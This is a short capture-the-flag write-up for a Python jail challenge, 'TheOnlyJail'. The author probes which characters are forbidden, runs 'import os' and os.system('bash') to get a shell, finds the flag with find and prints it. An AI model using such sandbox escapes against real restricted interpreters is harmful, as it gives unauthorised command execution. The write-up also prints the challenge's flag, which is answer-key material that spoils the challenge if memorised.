# TheOnlyJail

## Overview

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/Incognito-4.0/images/Pasted%20image%2020230218142849.png)

## Escape the jail

**In this challenge, we can connect to a docker instance:**
```shell
┌[siunam♥earth]-(~/ctf/Incognito-4.0/massive)-[2023.02.18|14:29:16(HKT)]
└> nc -nv 139.177.202.200 3333
(UNKNOWN) [139.177.202.200] 3333 (?) open
Welcome to the IIITL Jail! Escape if you can
jail> 
```

In a typical CTF pyjail challenge, we need to escape the restricted environment.

**First off, enumerate which characters are allowed:**
```shell
jail> !
Error: Error: forbidden character '!'
jail> @
Error: Error: forbidden character '@'
jail> #
Error: Error: forbidden character '#'
jail> $
Error: Error: forbidden character '$'
jail> %
Error: Error: forbidden character '%'
jail> ^
Error: Error: forbidden character '^'
jail> 
```

As you can see, many characters are forbidden.

**However, some characters are allowed:**
```shell
*()='":.,
```

**Hmm... If `'()` are allowed, can we import some Python libraries?**
```shell
jail> import os
jail> os.system('id') 
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

Oh!! We can! Most importantly, we can execute OS commands!!

**Let's try to spawn a shell!**
```shell
jail> os.system('bash')
whoami;hostname;id
ctf
32d84834a037
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
ls -lah
total 72K
drwxr-xr-x   1 root root 4.0K Feb 18 05:03 .
drwxr-xr-x   1 root root 4.0K Feb 18 05:03 ..
-rwxr-xr-x   1 root root    0 Feb 18 05:03 .dockerenv
lrwxrwxrwx   1 root root    7 Jan 26 02:03 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K Apr 18  2022 boot
drwxr-xr-x   5 root root  340 Feb 18 05:03 dev
drwxr-xr-x   1 root root 4.0K Feb 18 05:03 etc
drwxr-xr-x   1 root root 4.0K Feb 18 05:00 home
lrwxrwxrwx   1 root root    7 Jan 26 02:03 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Jan 26 02:03 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Jan 26 02:03 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Jan 26 02:03 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4.0K Jan 26 02:03 media
drwxr-xr-x   2 root root 4.0K Jan 26 02:03 mnt
drwxr-xr-x   2 root root 4.0K Jan 26 02:03 opt
dr-xr-xr-x 214 root root    0 Feb 18 05:03 proc
drwx------   2 root root 4.0K Jan 26 02:06 root
drwxr-xr-x   1 root root 4.0K Feb 18 05:03 run
lrwxrwxrwx   1 root root    8 Jan 26 02:03 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K Jan 26 02:03 srv
-rwxr-xr-x   1 root root   53 Feb 18 04:56 start.sh
dr-xr-xr-x  13 root root    0 Feb 18 05:03 sys
drwxrwxrwt   1 root root 4.0K Feb 18 04:59 tmp
drwxr-xr-x   1 root root 4.0K Jan 26 02:03 usr
drwxr-xr-x   1 root root 4.0K Jan 26 02:06 var
```

Nice! We successfully break out the pyjail!

**Let's use `find` to find the flag location:**
```shell
find / -name "*flag*" 2>/dev/null
/home/ctf/flag.txt
[...]
```

**Found it!**
```shell
cat /home/ctf/flag.txt
ictf{ff8ab219-a90b-44f8-9273-ccc13766f2eb}
```

- **Flag: `ictf{ff8ab219-a90b-44f8-9273-ccc13766f2eb}`**

# Conclusion

What we've learned:

1. Python Jailbreak Via Importing OS Library